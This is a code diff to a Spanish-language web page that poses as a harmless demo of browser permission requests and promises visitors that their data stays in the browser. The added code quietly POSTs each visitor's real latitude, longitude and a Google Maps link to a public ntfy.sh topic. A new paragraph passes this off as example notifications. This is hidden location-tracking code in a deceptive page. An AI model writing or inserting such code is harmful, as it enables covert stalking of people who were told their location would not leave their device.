@@ -60,6 +60,7 @@
       <li>Cómo los permisos pueden solicitarse en secuencia para recopilar más datos.</li>
     </ul>
     <p><strong>Nota importante:</strong> Esta página no almacena datos reales ni los comparte fuera de esta demostración. Todo se queda en tu navegador.</p>
+    <p>Para esta demostración, usamos <a href="https://ntfy.sh" target="_blank">ntfy.sh</a> para enviar notificaciones de ejemplo. <img src="https://ntfy.sh/static/img/ntfy.png" alt="Logo de ntfy" style="height: 20px; vertical-align: middle;"></p>
     <div id="status"></div>
   </div>
 
@@ -92,7 +93,17 @@
           navigator.geolocation.getCurrentPosition(function(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const maps = `https://maps.google.com/?q=${lat},${lon}`;
             statusDiv.innerHTML += '<p>¡Ubicación obtenida exitosamente!</p><p>Latitud: ' + lat + ', Longitud: ' + lon + '</p><p>En un sitio real, esta información podría enviarse a servidores para rastreo.</p>';
+            // Enviar notificación a ntfy.sh
+            fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
+              method: "POST",
+              body: `Ubicación recibida!\nLatitud: ${lat}\nLongitud: ${lon}\nMaps: ${maps}`
+            }).then(() => {
+              statusDiv.innerHTML += '<p>Notificación enviada a ntfy.sh.</p>';
+            }).catch(err => {
+              statusDiv.innerHTML += '<p>Error al enviar notificación: ' + err.message + '</p>';
+            });
           }, function(error) {
             statusDiv.innerHTML += '<p>Permiso de ubicación denegado o error: ' + error.message + '</p><p>Esto demuestra cómo los usuarios pueden controlar sus permisos.</p>';
           });
